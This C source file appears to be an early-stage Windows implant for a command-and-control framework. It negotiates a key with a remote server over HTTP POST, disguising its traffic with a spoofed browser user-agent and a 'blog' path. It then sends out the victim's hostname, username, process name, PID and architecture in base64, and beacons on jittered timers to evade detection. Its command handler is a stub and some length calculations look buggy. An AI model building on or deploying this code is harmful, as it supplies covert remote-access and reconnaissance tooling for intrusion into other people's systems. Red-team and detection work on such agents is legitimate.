#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include "log.h"

struct {
    CHAR*   address;
    INT     port;
} http;

struct {
    CHAR*   path;
    CHAR*   user_agent;
} transport;

struct {
    CHAR*   cookie;
    CHAR*   keyword; 
} auth;

struct {
    INT     status;
    CHAR*   format;
    CHAR*   buffer;
    CHAR    length[MAX_PATH];
    DWORD   size;
} data;

struct { 
    CHAR    hostname[MAX_PATH];
    CHAR    username[MAX_PATH];
    DWORD   pid;
    CHAR*   name;
    CHAR    arch[MAX_PATH];
} info;

struct {
    int     count;
} beacon;

CHAR* encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
    DWORD encoded_data_length = strlen(data_to_encode) * 2;
    CHAR* encoded_data = (CHAR*)malloc(encoded_data_length);

    log_debug("Attempting to encode data...");
    CryptBinaryToStringA((BYTE*)data_to_encode, data_to_encode_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded_data, &encoded_data_length);
    
    log_debug("Encoded data: %s", encoded_data); 
    log_debug("Encoded data length: %d", encoded_data_length);

    return encoded_data;
}

void package(CHAR* buffer) {
    CHAR* carriage_return = "%s\r\n\r\n";
    CHAR* content_length_header = "Content-Length: %lu\r\n"; 
    DWORD dw_error = GetLastError();

    DWORD package_length = strlen(carriage_return) + strlen(buffer);
    CHAR* package = (CHAR*)calloc(package_length, sizeof(CHAR));
    sprintf_s(package, package_length, carriage_return, buffer);

    sprintf_s(data.length, MAX_PATH, content_length_header, package_length);
    data.buffer = package;
    data.size = package_length;

    if (strcmp(data.buffer, "") == 0) {
        log_error("Error: %lu\n", dw_error);
    } 

    if (strcmp(data.length, "") == 0) {
        log_error("Error: %lu\n", dw_error);
    } else {
        log_debug("Header set: %s\n", data.length);
    }
}

void process_command(CHAR* command, CHAR* input) {
    CHAR* output = NULL;
    INT hex_command = atoi(command);

    log_debug("Command: %s", command);
    log_debug("Hex value: 0x%x", hex_command);
    log_debug("Input: %s", input);

    goto send_output;
    send_output:
        /**
         * Output data structure:
         * 
         *      Status      4       (INT)
         *          0: Negotiate
         *          1: Register
         *          2: Beacon
         *          3: Output
         *      Key         16      (CHAR*)
         *      Output      256     (CHAR*)
        */

        if (output != NULL) {
            goto cleanup;
        } else {
            goto cleanup;
        }
    cleanup:
        free(input);
        free(output);
}

void http_request() {
    HINTERNET h_internet;
    HINTERNET h_connect;
    HINTERNET h_request;
    DWORD dw_error = GetLastError();

    CHAR* query_buffer = NULL;
    CHAR* response = NULL;
    DWORD read_buffer;
    DWORD buffer_length = 0;
    DWORD available_size = 0;

    log_debug("Sending request for %d", data.status);
    beacon.count++;

    h_internet = InternetOpenA(transport.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

    h_connect = InternetConnectA(h_internet, http.address, http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);

    h_request = HttpOpenRequestA(h_connect, "POST", transport.path, 0, 0, 0, 0, 0);

    if (h_internet == NULL || h_connect == NULL || h_request == NULL) {
        log_error("Error: %lu\n", dw_error);
        goto cleanup;
    } else {
        HttpAddRequestHeadersA(h_request, data.length, -1, HTTP_ADDREQ_FLAG_ADD);
        if (HttpSendRequestA(h_request, 0, 0, data.buffer, data.size) == FALSE) {
            log_error("Error: %lu\n", dw_error);
            goto cleanup;
        }

        log_debug("Request sent");

        BOOL available = InternetQueryDataAvailable(h_request, &available_size, 0, 0);
        if (available == FALSE || available_size == 0) {
            log_error("Error: %lu\n", dw_error);
            goto cleanup;
        }

        query_buffer = (CHAR*)realloc(query_buffer, available_size + 1);
        memset(query_buffer, 0, available_size + 1);

        BOOL value = InternetReadFile(h_request, query_buffer, available_size, &read_buffer);
        if (value == FALSE || read_buffer == 0) {
            log_error("Error: %lu\n", dw_error);
            goto cleanup;
        }

        buffer_length += read_buffer;
        response = (CHAR*)realloc(response, buffer_length + 1);
        sprintf_s(response, buffer_length + 1, "%s\0", query_buffer);

        log_debug("Response: %s", response);
        
        goto process_response;
    }

    process_response:
        if (beacon.count <= 1) {
            CHAR* token = strtok(response, " ");

            if (strtok(NULL, " ") == NULL && strlen(response) == 20) {
                auth.cookie = token;
            } else {
                log_error("Unknown response");
            }
        } else {
            goto cleanup;
        }

    cleanup:
        free(data.buffer);
        free(response);
        InternetCloseHandle(h_internet);
        InternetCloseHandle(h_connect);
        InternetCloseHandle(h_request);
}

void agent_beacon() {
    /**
     * Beacon data structure:
     * 
     *      Status      4       (INT)
     *          0: Negotiate
     *          1: Register
     *          2: Beacon
     *          3: Output
     *      Key         16      (CHAR*)
    */

    data.status = 2;
    data.format = "%d:%s";

    DWORD pointer_length = strlen(data.format) + 4 + strlen(auth.cookie);
    CHAR* data_pointer = malloc(pointer_length);
    sprintf_s(data_pointer, pointer_length, data.format, data.status, auth.cookie);

    DWORD data_length = pointer_length - strlen(data.format) - 2;
    CHAR* buffer = encode(data_pointer, data_length);
    package(buffer);

    log_info("Buffer: %s", buffer); 

    goto clean_memory;
    clean_memory:
        log_debug("Attempting to clean memory");
        free(data_pointer);
        free(buffer);
}

void register_device() {
    /**
     * Registration data structure:
     * 
     *      Status          4       (INT)
     *          0: Negotiate
     *          1: Register
     *          2: Beacon
     *          3: Output
     *      Key             256     (CHAR*)
     *      Hostname        256     (CHAR)
     *      Username        256     (CHAR)
     *      Process name    256     (CHAR*)
     *      Process id      4       (DWORD)
     *      Arch            256     (CHAR)
     * 
    */

    DWORD default_length = 256;
    DWORD dw_error = GetLastError();

    PROCESSENTRY32 process_info;
    process_info.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    data.status = 1;
    data.format = "%d:%s,%s,%s,%lu,%s,%s";

    if (GetComputerNameA(info.hostname, &default_length)) {
        log_info("Hostname %s", info.hostname);
    } else {
        log_error("Error: %lu", dw_error);
    }
    
    if (GetUserNameA(info.username, &default_length)) {
        log_info("Username: %s", info.username);
    }
    else {
        log_error("Error: %lu", dw_error);
    }

    if (GetCurrentProcessId()) {
        info.pid = GetCurrentProcessId();
        log_info("Process ID: %lu", info.pid);
    }
    else {
        log_error("Error: %lu", dw_error);
    }

    if (Process32First(snapshot, &process_info)) {
        while (Process32Next(snapshot, &process_info)) {
            if (info.pid == process_info.th32ProcessID) {
                info.name = _strdup(process_info.szExeFile);
                log_info("Process Name: %s", info.name);
            }
        }
    }
    else {
        log_error("Error: %lu\n", dw_error);
    }

    if (GetEnvironmentVariableA("PROCESSOR_ARCHITECTURE", info.arch, default_length)) {
        log_info("Operating System Arch: %s", info.arch);
    }
    else {
        log_error("Error: %lu\n", dw_error);
    }

    DWORD pointer_length = strlen(data.format) + 4 + strlen(auth.cookie) + strlen(info.hostname) + strlen(info.username) + 4 + strlen(info.name) + strlen(info.arch);
    CHAR* data_pointer = malloc(pointer_length);
    sprintf_s(data_pointer, pointer_length, data.format, data.status, auth.cookie, info.hostname, info.username, info.pid, info.name, info.arch);

    DWORD data_length = pointer_length - strlen(data.format) + 4;
    CHAR* buffer = encode(data_pointer, data_length);
    package(buffer);

    log_info("Buffer: %s", buffer); 
    
    goto clean_memory;
    clean_memory:
        log_debug("Attempting to clean memory");
        free(data_pointer);
        free(buffer);
        free(info.name);
        CloseHandle(snapshot);
}

void negotiate_key(CHAR* keyword) {
    /**
     * Key negotiation data structure:
     *      Status          4       (INT)
     *          0: Negotiate
     *          1: Register
     *          2: Beacon
     *          3: Output
     *      Keyword         256     (CHAR*)
     * 
    */

    data.status = 0;
    data.format = "%d:%s";

    DWORD pointer_length = strlen(data.format) + 4 + strlen(auth.keyword);
    CHAR* data_pointer = malloc(pointer_length);
    sprintf_s(data_pointer, pointer_length, data.format, data.status, auth.keyword);

    DWORD data_length = pointer_length - strlen(data.format) - 2;
    CHAR* buffer = encode(data_pointer, data_length);
    package(buffer);

    log_info("Buffer: %s", buffer); 

    http_request();

    goto clean_memory;
    clean_memory:
        log_debug("Attempting to clean memory");
        free(data_pointer);
        free(buffer);
}

float calculate_jitter(int seconds, int percent) {
    float jitter = (((seconds * percent / 100) + (rand() % ((seconds + (seconds * percent / 100)) + 1))) * 1000);
    log_info("Sleep time: %.6f", jitter);
    return jitter;
}

int main(int argc, char* argv[]) {
    if (argc == 2) {
        http.address = argv[1];
        http.port = 1337;

    } else if (argc == 3) {
        http.address = argv[1];
        http.port = atoi(argv[2]);
    } else {
        http.address = "127.0.0.1";
        http.port = 1337;
    }

    log_info("Address: %s", http.address);
    log_info("Port: %d", http.port);

    transport.path = "blog";
    transport.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";

    auth.cookie = "beanpocolypse";
    auth.keyword = "schistosomiasis";

    log_info("Path: %s", transport.path);
    log_info("User Agent: %s", transport.user_agent);
    log_info("Keyword: %s", auth.keyword);
    
    negotiate_key(auth.keyword);
    Sleep(calculate_jitter(3, 30));
    register_device();
    Sleep(calculate_jitter(3, 30));
    agent_beacon();
    Sleep(calculate_jitter(3, 30));
}